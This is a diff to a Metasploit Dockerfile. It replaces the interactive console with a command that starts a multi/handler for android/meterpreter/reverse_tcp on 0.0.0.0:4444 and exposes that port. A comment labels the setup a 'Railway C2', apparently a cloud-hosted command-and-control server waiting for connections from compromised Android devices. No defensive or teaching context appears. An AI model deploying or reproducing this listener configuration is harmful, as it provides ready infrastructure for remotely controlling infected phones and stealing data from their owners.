@@ -70,7 +70,7 @@ RUN apk add --no-cache curl bash sqlite-libs nmap nmap-scripts nmap-nselibs \
     openssl-dev nasm
 RUN\
     if [ "${TARGETARCH}" = "arm64" ];\
-	then apk add --no-cache gcc musl-dev python3-dev libffi-dev gcompat;\
+    then apk add --no-cache gcc musl-dev python3-dev libffi-dev gcompat;\
     else apk add --no-cache mingw-w64-gcc;\
     fi
 
@@ -98,4 +98,6 @@ WORKDIR $APP_HOME
 # it results in access denied errors.
 ENTRYPOINT ["docker/entrypoint.sh"]
 
-CMD ["./msfconsole", "-r", "docker/msfconsole.rc", "-y", "$APP_HOME/config/database.yml"]
+# Tweak for Railway C2: Start handler daemon instead of interactive console
+EXPOSE 4444
+CMD ["bash", "-c", "msfdb init && msfconsole -q -x 'use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; exploit -j; while true; do sleep 30; done'"]
